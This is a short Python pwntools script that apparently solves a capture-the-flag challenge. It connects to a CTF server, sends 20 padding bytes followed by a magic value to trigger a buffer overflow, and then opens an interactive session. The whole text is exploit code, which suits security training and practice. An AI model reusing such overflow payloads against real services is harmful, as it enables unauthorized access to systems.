from pwn import *

NC = "nc ctf.tcp1p.com 17027".split()

r = remote(NC[1], NC[2])
payload = b'a'*20 + b"\x50\x57\x4e\x00"
r.sendline(payload)
r.interactive()